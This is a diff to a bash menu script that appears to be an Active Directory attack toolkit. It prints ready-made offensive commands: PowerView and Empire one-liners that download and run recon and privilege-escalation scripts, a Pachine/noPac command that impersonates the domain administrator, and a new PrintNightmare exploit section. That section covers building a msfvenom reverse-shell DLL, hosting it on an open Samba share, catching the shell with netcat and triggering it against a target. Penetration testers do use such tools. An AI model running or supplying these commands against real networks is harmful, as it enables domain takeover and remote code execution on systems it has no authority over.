@@ -6,8 +6,8 @@
 ################################################################################
 
 
-LocalIP="";		#
-LocalPort="";		#
+LocalIP="[Local-IP]";		#
+LocalPort="[Local-Port]";		#
 Username="''";			#
 NQUsername="";			#
 Password="''";			#
@@ -20,6 +20,16 @@ DC="";				#
 NS="<IP>";			#
 Version="v2.1"			#
 MainCheck="1"			#
+
+################################################################################
+# Future Repo's for external                                                   #
+################################################################################
+
+"https://github.com/cybersecurityworks553/CVE-2021-1675_PrintNightMare.git"
+"https://github.com/ly4k/Pachine.git"
+"https://github.com/WazeHell/sam-the-admin.git"
+
+
 
 
 ################################################################################
@@ -96,6 +106,7 @@ cd $HOME/ADAT
 
 # Set local repo locations in the ADAT folder.
 
+adPEASLocalRepo="$HOME/ADAT/adPEAS"
 BloodHoundLocalRepo="$HOME/ADAT/BloodHound"
 Certificate="$HOME/ADAT/LocalRepo"
 DomainPasswordSprayLocalRepo="$HOME/ADAT/DomainPasswordSpray"
@@ -281,6 +292,20 @@ else
 	echo -e ""
 fi
 
+if [ -d "$adPEASLocalRepo" ]
+then
+	echo -e ""
+    	echo -e "adPEAS is installed, checking if updated to latest version."
+    	cd $adPEASLocalRepo
+    	git pull "https://github.com/61106960/adPEAS.git"
+ 	echo -e ""
+else
+	echo -e ""
+	echo -e "${LGREEN}Cloning adPEAS Repo${RESTORE}"
+	git clone --recursive "https://github.com/61106960/adPEAS.git" $HOME/ADAT/adPEASRepo
+	echo -e ""
+fi
+
 # Copy local repo contents to single folder
 
 cp -r $HOME/ADAT/BloodHound/* $HOME/ADAT/LocalRepo
@@ -295,6 +320,7 @@ cp -r $HOME/ADAT/Inveigh/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/DomainPasswordSpray/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/S3cur3Th1sSh1tCreds/* $HOME/ADAT/LocalRepo
 cp -r $HOME/ADAT/InvokeNoPacRepo/* $HOME/ADAT/LocalRepo
+cp -r $HOME/ADAT/adPEASRepo/* $HOME/ADAT/LocalRepo
 
 # Set script repo locations to local IP and Port
 
@@ -313,6 +339,7 @@ PowerSharpPackRepo="http://$LocalIP:$LocalPort/"
 InveighRepo="http://$LocalIP:$LocalPort/"
 DomainPasswordSprayRepo="http://$LocalIP:$LocalPort/"
 InvokeNoPacRepo="http://$LocalIP:$LocalPort/"
+adPEASRepo="http://$LocalIP:$LocalPort/"
 LocalRepo="True"
 
 }
@@ -357,6 +384,7 @@ echo -e "${YELLOW}Checking if Repositories are updated${RESTORE}"
 
 Function_LocalRepo
 
+
 echo -e "${LGREEN}Repositories are up to date${RESTORE}"
 
 echo -e "${YELLOW}Starting Python server${RESTORE}"
@@ -367,7 +395,8 @@ echo -e "Python server starting on http://$LocalIP:$LocalPort"
 
 python3 -m http.server $LocalPort --directory "$HOME/ADAT/LocalRepo" &> /dev/null &
 
-sleep 2s
+sleep 3s
+	
 
 echo -ne "
 
@@ -1138,6 +1167,7 @@ echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/HostRecon.ps1);
 echo -e ""
 echo -e "${IBLUE}Invoke-Seatbelt${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-Seatbelt.ps1);Invoke-Seatbelt -Command -group=all"
+echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-Seatbelt.ps1);Invoke-Seatbelt -Command -group=all | Out-file SbResults.txt"
 echo -e ""
 echo -e "${IBLUE}Invoke-WinEnum${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-WinEnum.ps1);Invoke-WinEnum"
@@ -1226,7 +1256,7 @@ echo -e ""
 echo -e "${IBLUE}Get ACLs for specified prefix${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-ObjectACL -ADSprefix 'CN=Administrators,CN=Users' -Verbose"
 echo -e ""
-echo -e "${IBLUE}Get ACLs for specified prefix${RESTORE}"
+echo -e "${IBLUE}Get the ACLs associated with the specified Path${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-PathACL -Path '\\\\\\\\Security.local\SYSVOL'"
 echo -e ""
 echo -e "" 
@@ -1239,7 +1269,7 @@ echo -ne  "Return to Previous Menu?
 
         read a
         case $a in
-        	1) Internal_Menu_Recon_Domain ;;
+        	q|Q) 	Internal_Menu_Recon_Domain ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -1270,7 +1300,7 @@ echo -ne  "Return to Domain Recon Menu?
 
         read a
         case $a in
-        	1) Internal_Menu_Recon_Domain ;;
+        	q|Q) 	Internal_Menu_Recon_Domain ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -1310,7 +1340,7 @@ echo -ne  "Return to Domain Recon Menu?
 
         read a
         case $a in
-        	1) Internal_Menu_Recon_Domain ;;
+        	q|Q) Internal_Menu_Recon_Domain ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -1344,7 +1374,7 @@ echo -ne  "Return to Domain Recon Menu?
 
         read a
         case $a in
-        	1) Internal_Menu_Recon_Domain ;;
+        	q|Q) Internal_Menu_Recon_Domain ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -1361,8 +1391,8 @@ echo -e ""
 echo -e ""
 echo -e "${LGREEN}Domain Forests${RESTORE}"
 echo -e ""
-echo -e "${IBLUE}Enumerate trusts across the Domain${RESTORE}"
-echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get details about current Forest"
+echo -e "${IBLUE}Get details about the current forest${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForest"
 echo -e ""
 echo -e "${IBLUE}Get all Domains in current Forest${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestDomain"
@@ -1383,7 +1413,7 @@ echo -ne  "Return to Domain Recon Menu?
 
         read a
         case $a in
-        	1) Internal_Menu_Recon_Domain ;;
+        	q|Q) 	Internal_Menu_Recon_Domain ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -1405,7 +1435,7 @@ echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO | Select DisplayName"
 echo -e ""
 echo -e "${IBLUE}Get GPO's applied to specific OU${RESTORE}"
-echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO -ADSpath ((Get-NetOU '<OU-Name>' -FullData).gplink.split(';')[0] -replace '^.')"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGPO -ADSpath ((Get-NetOU '[OU-Name]' -FullData).gplink.split(';')[0] -replace '^.')"
 echo -e ""
 echo -e ""
 
@@ -1417,7 +1447,7 @@ echo -ne  "Return to Domain Recon Menu?
 
         read a
         case $a in
-        	1) Internal_Menu_Recon_Domain ;;
+        	q|Q) 	Internal_Menu_Recon_Domain ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -1435,14 +1465,17 @@ echo -e "${LGREEN}Domain Groups${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}List all Groups${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup | Select SamAccountName | Sort SamAccountName"
 echo -e ""
 echo -e "${IBLUE}List all Groups with partial wilcard${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup "\"*admin*"\""
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup "\"*admin*"\" | Select SamAccountName | Sort SamAccountName"
 echo -e ""
 echo -e "${IBLUE}Identify interesting groups on a Domain Controller${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup Get-NetDomainController | Get-NetLocalGroup -Recurse"
 echo -e ""
 echo -e "${IBLUE}List Groups of which a user is a member of${RESTORE}"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup Get-NetLocalGroup -Username '<Username>'"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetGroup Get-NetLocalGroup -Username '<Username>'"
 echo -e ""
 echo -e "${IBLUE}Get all the effective members of a group${RESTORE}"
@@ -1458,7 +1491,7 @@ echo -ne  "Return to Domain Recon Menu?
 
         read a
         case $a in
-        	1) Internal_Menu_Recon_Domain ;;
+        	q|Q) 	Internal_Menu_Recon_Domain ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -1491,7 +1524,7 @@ echo -ne  "Return to Domain Recon Menu?
 
         read a
         case $a in
-        	1) Internal_Menu_Recon_Domain ;;
+        	q|Q) 	Internal_Menu_Recon_Domain ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -1512,8 +1545,8 @@ echo -e "${IBLUE}Get all Domains in Forest then list each Domain trust${RESTORE}
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetForestDomain -Verbose | Get-NetDomainTrust"
 echo -e ""
 echo -e "${IBLUE}Map all reachable Domain trusts${RESTORE}"
-echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-MapDomainTrusts"
-echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-MapDomainTrusts -LDAP"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-MapDomainTrust"
+echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-MapDomainTrust -LDAP"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Invoke-MapDomainTrust | Select SourceDomain,TargetDomain,TrustType,TrustDirection"
 echo -e ""
 echo -e "${IBLUE}List external trusts${RESTORE}"
@@ -1535,7 +1568,7 @@ echo -ne  "Return to Domain Recon Menu?
 
         read a
         case $a in
-        	1) Internal_Menu_Recon_Domain ;;
+        	q|Q) 	Internal_Menu_Recon_Domain ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -1559,9 +1592,6 @@ echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -UAC
 echo -e ""
 echo -e "${IBLUE}Get Specific user account${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Get-NetUser -Username '<Username>'"
-echo -e ""
-echo -e "${IBLUE}Search for string in User Description field${RESTORE}"
-echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);Find-UserField -SearchField Description -SearchTerm 'built'"
 echo -e ""
 echo -e "${IBLUE}Get all users with passwords changed more than 3 years ago${RESTORE}"
 echo -e "$DownloadMethod "$PowersploitRepo"Recon/PowerView.ps1);\$Date = (Get-Date).AddYears(-3).ToFileTime(); Get-DomainUser -LDAPFilter ""\"(pwdlastset<=\$Date)"\"" -Properties samaccountname,pwdlastset"
@@ -1591,7 +1621,7 @@ echo -ne  "Return to Domain Recon Menu?
 
         read a
         case $a in
-        	1) Internal_Menu_Recon_Domain ;;
+        	q|Q) 	Internal_Menu_Recon_Domain ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
@@ -1647,12 +1677,13 @@ echo -e "${LGREEN}Network Enumeration${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Invoke-ARPScan${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-ARPScan.ps1);Invoke-ARPScan -CIDR '<CIDR>'"
+echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-ARPScan.ps1);Invoke-ARPScan -CIDR '<CIDR>' | Out-File ArpScan.txt"
 echo -e ""
 echo -e "${IBLUE}Invoke-PortScan${RESTORE}"
-echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR> or <IP>' -TopPorts 1000 -oA -GrepOut Scan.txt"
-echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR>' -P 135,445 -Open -oA SMB.txt"
-echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR>' -P 1433 -Open -oA MSSQL.txt"
-echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR>' -P 80,443,8080 -Open -oA Web.txt"
+echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR>' -TopPorts 1000 -Open -oA Scan.txt"
+echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR>' -P "\"135,445"\" -Open -oA SMB.txt"
+echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR>' -P "\"1433"\" -Open -oA MSSQL.txt"
+echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/network/Invoke-Portscan.ps1);Invoke-Portscan -Hosts '<CIDR>' -P "\"80,443,8080"\" -Open -oA Web.txt"
 echo -e ""
 echo -e "${IBLUE}BloodHound${RESTORE}"
 echo -e "$DownloadMethod "$BloodHoundRepo"Collectors/SharpHound.ps1);Invoke-Bloodhound -CollectionMethod All"
@@ -1792,7 +1823,7 @@ echo -e ""
 echo -e ""
 echo -e "${LGREEN}Privilege Escalation (Exploits)${RESTORE}"
 echo -e ""
-echo -e "${IBLUE}Invoke-Printnightmare${RESTORE}"
+echo -e "${IBLUE}Invoke-Printnightmare (LPE)${RESTORE}"
 echo -e "$DownloadMethod "$EmpireRepo"privesc/Invoke-Printnightmare.ps1);Invoke-Nightmare"
 echo -e ""
 echo -e "${IBLUE}Get-System${RESTORE}"
@@ -2705,14 +2736,16 @@ echo -e "${LGREEN}Recent CVE's${RESTORE}"
 echo -ne " What would you like to do?
 
 
-	1)  ->  [ NoPac ${LYELLOW}WIP${RESTORE}	]
+	1)  ->  [ NoPac		  ]  ${LYELLOW}WIP${RESTORE}
+	2)  -> 	[ Print Nightmare ]  ${LYELLOW}WIP${RESTORE}
 	
-	Q)  ->	[Previous Menu	]
+	Q)  ->	[Previous Menu	  ]
 
 "
         read a
         case $a in
                 1) 	External_Menu_CVEs_NoPac ;;
+                2)	External_Menu_CVEs_PrintNightmare ;;
                 q|Q)	External_Menu_Main ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
@@ -2795,6 +2828,10 @@ echo -e ""
 echo -e "${IBLUE}Pachine${RESTORE}"
 echo -e "python3 pachine.py -dc-host $NQIP -spn cifs/$NQIP -impersonate administrator $NQDomain/$NQUsername:$Password"
 echo -e ""
+echo -e ""
+echo -e "${PURPLE}Important:${RESTORE} Ensure computer accounts are cleaned up. Even failed attemps may produce computer accounts in the Domain"
+echo -e ""
+echo -e ""
 
 echo -ne  "Return to Previous Menu?
 
@@ -2808,6 +2845,129 @@ echo -ne  "Return to Previous Menu?
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
         esac
+
+}
+
+External_Menu_CVEs_PrintNightmare(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Print Nightmare Menu${RESTORE}"
+
+echo -ne " What would you like to do?
+
+
+	1)  ->  [ Check    	]
+	2)  ->	[ Exploit  	]
+	
+	Q)  ->	[Previous Menu	]
+
+"
+        read a
+        case $a in
+                1) 	External_Menu_CVEs_PrintNightmare_Check ;;
+                2)	External_Menu_CVEs_PrintNightmare_Exploit ;;
+                q|Q) 	External_Menu_CVEs ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+
+}
+
+External_Menu_CVEs_PrintNightmare_Check(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Print Nightmare (Check)${RESTORE}"
+echo -e ""
+# Add install to script
+echo -e "${IBLUE}PrintNightmareScanner${RESTORE}"
+echo -e ""
+echo -e "python3 detectprintnightmare.py -t [SingleIP]"
+echo -e "python3 detectprintnightmare.py -T [TargetsFile.txt]"
+echo -e "python3 detectprintnightmare.py -c [10.10.10.0/24]"
+echo -e ""
+echo -e "${IBLUE}rpcdump${RESTORE}"
+echo -e "python3 rpcdump.py @$IP | egrep 'MS-RPRN|MS-PAR'"
+echo -e ""
+echo -e ""
+echo -e ""
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	External_Menu_CVEs_PrintNightmare ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+
+}
+
+External_Menu_CVEs_PrintNightmare_Exploit(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Print Nightmare (RCE) (Exploit)${RESTORE}"
+echo -e ""
+# Add install to script
+echo -e "${IBLUE}#1: Configure smb.conf${RESTORE}"
+echo -e ""
+echo -e "Add the following to the end of /etc/samba/smb.conf"
+echo -ne "
+
+[smb]
+    comment = Samba
+    path = /tmp/share
+    guest ok = yes
+    read only = yes
+    browsable = yes
+    force user = nobody
+
+"
+echo -e "${IBLUE}#2: Start samba service and create directory for hosted DLL${RESTORE}"
+echo -e "sudo apt install samba (install if not already)"
+echo -e "sudo service smbd start"
+echo -e "mkdir /tmp/share"
+echo -e ""
+echo -e "${IBLUE}#3: Build msfvenom payload and set up netcat ${RESTORE}"
+echo -e "msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=8888 -f dll -o /tmp/share/rev.dll"
+echo -e "nc -lvp 8888"
+echo -e ""
+echo -e "${IBLUE}#4: Exploit${RESTORE}"
+echo -e "./printnightmare.py -dll '\\\\\\\\$LocalIP\\\\smb\\\\rev.dll' $Username:$Password@$IP"
+echo -e "Exploit may appear to have failed. However a reverse shell should have been caught."
+echo -e ""
+echo -e ""
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	External_Menu_CVEs_PrintNightmare ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
 
 }
 
